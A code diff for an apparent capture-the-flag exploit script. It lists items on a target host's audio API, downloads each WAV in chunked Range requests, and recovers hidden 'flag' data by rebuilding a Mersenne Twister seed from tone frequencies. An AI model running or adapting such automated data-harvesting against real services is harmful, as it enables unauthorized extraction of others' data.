@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 
-import mt
+import io
 import sys
+import requests
 import numpy as np
 import scipy.fft as fft
 
 from typing import List
 from scipy.io import wavfile
+
+import mt
 
 
 BASE_FREQUENCY = 256
@@ -54,10 +57,10 @@ def extract_state(freqs: List[int]) -> List[int]:
     return state
 
 
-def main():
+def extract_data(wav: bytes) -> bytes:
     prec = 16
 
-    sample_rate, data = wavfile.read(sys.argv[1])
+    sample_rate, data = wavfile.read(io.BytesIO(wav))
     all_freqs = []
 
     for i in range(data.ndim):
@@ -74,7 +77,38 @@ def main():
     seed_array = mt.recover_seed(state)
     seed_data = mt.array_to_bytes(seed_array)
 
-    print(seed_data)
+    return seed_data
+
+
+def download_wav(url: str, chunks_count: int) -> bytes:
+    offset = 0
+    chunks = []
+
+    for i in range(chunks_count):
+        headers = {
+            'Range': f'bytes={offset}-'
+        }
+
+        chunk = requests.get(url, headers=headers).content
+
+        chunks.append(chunk)
+        offset += len(chunk)
+
+    return b''.join(chunks)
+
+
+def main():
+    IP = sys.argv[1]
+    PORT = 17171
+
+    url = f'http://{IP}:{PORT}'
+
+    for id in requests.get(f'{url}/api/list/').json():
+        wav_url = f'{url}/api/listen/{id}/'
+        wav = download_wav(wav_url, 16)
+
+        flag = extract_data(wav)
+        print(flag)
 
 
 if __name__ == '__main__':
